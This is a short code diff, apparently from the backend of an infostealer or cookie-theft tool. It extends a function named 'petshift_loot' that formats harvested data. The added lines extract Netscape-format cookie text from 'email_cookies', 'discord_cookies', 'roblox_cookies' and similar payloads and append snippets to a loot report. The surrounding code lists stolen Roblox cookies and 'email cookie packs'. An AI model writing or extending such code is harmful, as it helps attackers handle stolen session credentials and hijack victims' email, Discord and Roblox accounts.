@@ -1551,6 +1551,17 @@ def petshift_loot():
                 lines.append("storage.roblox_cookies:")
                 for ck, cv in list(stor["roblox_cookies"].items())[:8]:
                     lines.append(f"  {ck}: {str(cv)[:120]}")
+        if kind in ("email_cookies", "discord_cookies", "roblox_cookies", "netscape_all", "roblox") and isinstance(payload, dict):
+            snippet = ""
+            if isinstance(payload.get("netscape"), str):
+                snippet = payload.get("netscape")[:800]
+            elif isinstance(payload.get("netscape_security"), str):
+                snippet = payload.get("netscape_security")[:800]
+            elif isinstance(payload.get("text"), str):
+                snippet = payload.get("text")[:800]
+            if snippet:
+                lines.append("netscape snippet:\n" + snippet)
+            # netscape snippet
         if kind == "email_cookies" and isinstance(payload, dict):
             counts = payload.get("counts") or {}
             lines.append("email cookie packs: " + ", ".join(f"{k}={v}" for k,v in counts.items()))
